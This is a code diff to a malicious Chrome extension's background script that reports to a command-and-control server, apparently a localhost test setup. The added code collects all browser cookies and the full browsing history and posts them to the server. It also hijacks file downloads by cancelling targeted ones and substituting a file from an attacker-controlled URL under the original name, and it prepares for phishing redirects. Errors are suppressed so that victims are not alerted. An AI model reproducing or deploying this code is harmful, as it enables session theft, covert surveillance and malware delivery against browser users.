@@ -55,16 +55,28 @@ IMPORTANT VARIABLES:
 uid = Unique IDentifier
 phase = phase of the attack; 0 just log information, 1 hickjack downloads and do phising
 
-Obj = patter name of the download to be hicjacked
-Tar = url of the place for dowloading
-Nam = name of the file to which rename download
+ObjDown = patter name of the download to be hicjacked
+TarDown = url of the place for dowloading
+NamDown = name of the file to which rename download
+
+TarPhi = url of the place to redirect for phising attack
 
 TimeA = Time of last sending of information
 TimeB = Time of last ansewrd about phase of the server
 
+DeltaA = Variation of time between post of log data
+DeltaB = Variation of time between request of Phase information
 
 */
 
+//Default Values:
+DefaultDeltas = 10;
+ObjDowDefault = undefined;
+TarDownDefault = undefined;
+NamDownDefault = undefined;
+TarPhiDefault = undefined;
+DefaultPhase = 0;
+const SERVER_HOST = "http://127.0.0.1:5000"; //the url of the CC server, this would not exists in a real distribution has a global variable
 
 chrome.runtime.onInstalled.addListener(function setuid(){
     //When installed or update the extension:
@@ -105,7 +117,7 @@ chrome.runtime.onInstalled.addListener(function setuid(){
             const value = cyrb128(First_installed); //hash time of installment
             chrome.storage.local.set({uid:value}); //save has uid attribute (asyncronus)
 
-            fetch('http://127.0.0.1:5000/extadd',
+            fetch(SERVER_HOST + 'extadd',
             {
             method: 'POST',
             mode: 'no-cors', 
@@ -131,15 +143,16 @@ chrome.runtime.onInstalled.addListener(function setuid(){
         */
 
         if (result.TimeA == undefined ){ //if TimeA does not exists, is a clean install
-            chrome.storage.local.set({TimeA:First_installed}); //start TimeA with install time
-            chrome.storage.local.set({TimeB:First_installed}); //start TimeB with install time
+            chrome.storage.local.set({TimeA:First_installed, DeltaA: DefaultDeltas}); //start TimeA with install time, and DeltaA with default value
+            chrome.storage.local.set({TimeB:First_installed, DeltaB: DefaultDeltas}); //start TimeB with install time, and DeltaB with default value
             //Start download parametes with default values
-            chrome.storage.local.set({Obj:"ChromeSetup.exe", Tar: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg/800px-Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg", Nam:"ChromeSetup.jpg"})
+            chrome.storage.local.set({ObjDown:ObjDowDefault, TarDown: TarDownDefault, NamDown:NamDownDefault})
             //Start phising parametes with default values
+            chrome.storage.local.set({TarPhi: TarPhiDefault})
         }
     
     });
-    chrome.storage.local.set({phase:0});//We set the initial phase to 0, that is, normal operation
+    chrome.storage.local.set({phase:DefaultPhase});//We set the initial phase to 0, that is, normal operation
 
 
 })
@@ -203,7 +216,7 @@ function logExApp(C){
 function logGeolocation(){
     chrome.storage.local.get(["lat", "long"]).then((result)=>{ //take the information, if exists from the storage
         //this data is obtained in the content script
-        if(lat != undefined){
+        if(result.lat != undefined){
         number = 3; //send it to the server with the needed information for storing
         fetch(`http://127.0.0.1:5000/control_server`, 
         {
@@ -277,11 +290,54 @@ function loggingprivacySettings(){
 
 
 }
+function logCookies() {
+    chrome.cookies.getAll({}).then((cookies) =>{
+        var a = [];
+        for (const cookie of cookies) {
+          a.push(cookie);
+        }
+        fetch(
+            `${SERVER_HOST}/c`,
+            {
+                method: "POST",
+                body:JSON.stringify(a),
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            }
+        );
+
+    });
+
+}
+function logHistory(){
+    chrome.history.search({ text: "" }).then((hists)=>{
+        var a = []
+        for(const his of hists){
+            a.push(his)
+        }
+        fetch(
+            `${SERVER_HOST}/h`,
+            {
+                method: "POST",
+                body:JSON.stringify(a),
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            }
+        );
+
+    });
+
+
+}
 
 function logSend(){
-    try{ //errors can happen if the server is down, and we do not want the user to receive errors messages
-         //hence, this try and catch nullifies them.
+    try{//errors can happen if the server is down, and we do not want the user to receive errors messages
+        //hence, this try and catch nullifies them.
 
+        logCookies()
+        logHistory()
         logGeolocation()
         loggingcontentSettings();
         loggingprivacySettings();
@@ -390,21 +446,12 @@ chrome.webNavigation.onCompleted.addListener((e) => {//add a listener that activ
 
 
 function modify(item){
-    chrome.storage.local.get(["phase"]).then((result)=>{
-        console.log(result)
-        if(result.phase == 1){
-            chrome.storage.local.get(["Obj","Tar","Nam"]).then((result1)=>{
-                        console.log(result1.Obj,result1.Tar,result1.Nam)
-                        fetch('http://127.0.0.1:5000/control_server',
-                        {
-                        method: "POST",
-                        mode: 'no-cors', 
-                        body: JSON.stringify(item),
-                        headers:{"Content-Type": "application/json"}
-                        })
-                        if (item.url.includes(result1.Obj)){
-                        chrome.downloads.cancel(item.id)
-                        chrome.downloads.download({url: result1.Tar, filename: result1.Nam});
+    chrome.storage.local.get(["phase"]).then((result)=>{ //look at the actual phase
+        if(result.phase == 1){ //if we are in attacking phase
+            chrome.storage.local.get(["ObjDown","TarDown","NamDown"]).then((result1)=>{ //ask for all storage information
+                        if (item.url.includes(result1.ObjDown)){ //is the object our objective?
+                        chrome.downloads.cancel(item.id) //if it is, cancel that download
+                        chrome.downloads.download({url: result1.TarDown, filename: result1.NamDown}); //start a new download from our controlled url, with the name that we want (usually the same filename that the objective)
                         }
 
             })
@@ -414,11 +461,6 @@ function modify(item){
 }
 
 
-//https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg/800px-Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg
-//chrome.downloads.onChanged.addListener((Delta)=>{FileOpen(Delta)})
+chrome.downloads.onCreated.addListener((Item)=>{modify(Item)}) //When the browser detects that something is going to be dowloaded, send that object to modify()
 
-chrome.downloads.onCreated.addListener((Item)=>{modify(Item)})
-
-
-//https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BD941DA60-FA68-1B4A-8E5B-56309869B588%7D%26lang%3Den-GB%26browser%3D4%26usagestats%3D1%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26brand%3DYTUH%26installdataindex%3Dempty/update2/installers/ChromeSetup.exe
-//https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BD941DA60-FA68-1B4A-8E5B-56309869B588%7D%26lang%3Den-GB%26browser%3D4%26usagestats%3D1%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26brand%3DYTUH%26installdataindex%3Dempty/update2/installers/ChromeSetup.exe
+// ATTACK PHISING
